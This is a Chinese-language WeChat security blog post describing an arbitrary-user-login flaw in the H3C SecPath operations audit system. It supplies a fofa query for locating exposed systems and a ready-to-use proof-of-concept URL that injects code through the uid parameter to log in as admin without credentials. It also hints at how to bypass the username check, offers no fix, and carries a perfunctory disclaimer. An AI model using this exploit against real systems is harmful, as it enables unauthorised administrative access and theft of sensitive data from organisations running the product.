#  H3C SecPath运维审计系统 任意用户登录漏洞

融云安全-sm  [ Hack All ](javascript:void\(0\);)

**Hack All** ![]()

微信号 PTIOVHA

功能介绍 专注于网络安全，渗透测试，文章和工具分享，包括但不限于Web安全、物联网安全、车联网安全，我们的目标是Hack All！

____

___发表于_

收录于合集

#漏洞复现 13 个

#漏洞库 25 个

**免责声明**

本公众号仅用于技术交流与学习，利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号只是知识的搬运工，取之于民用之于民。

 **0x01  阅读须知**

**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。
本文所提供的工具仅用于学习，禁止用于其他！！！**

 **0x02 漏洞描述**

H3C
SecPath运维审计系统是基于用户现阶段面临的运维难题提出的一款运维风险管控产品。借助身份认证、权限控制、操作审计等功能，从操作层面解决了企业现存的IT内控与管理问题，使运维操作管理进入安全与便利相结合的阶段，帮助客户提高整体运维安全水平，使运维操作管理过程变得更加简单、安全、有效。H3C
SecPath运维审计系统存在任意用户登录漏洞，攻击者通过漏洞可以未授权登录系统管理员，导致敏感信息被窃取等问题。![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619143638.png)

 **0x03 漏洞复现**

 **fofa** **：** "H3C SecPath运维审计系统"

1.执行POC可未授权登录系统

  * 

    
    
    https://{{Hostname}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin

![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619143639.png)

![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619143640.png)

2.看到Poc是不是有点眼熟，这不是和某治堡垒机任意用户登录一样吗？不得不说很多产品某些功能代码重复率很高啊，深入挖掘发现出现下面错误说明漏洞存在，只是登录用户名错误，怎么绕过你懂得

![](https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230619143641.png)

3.修改login参数值为合法用户名即可未授权进入系统，xray漏洞扫描脚本星球自提

![]()

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

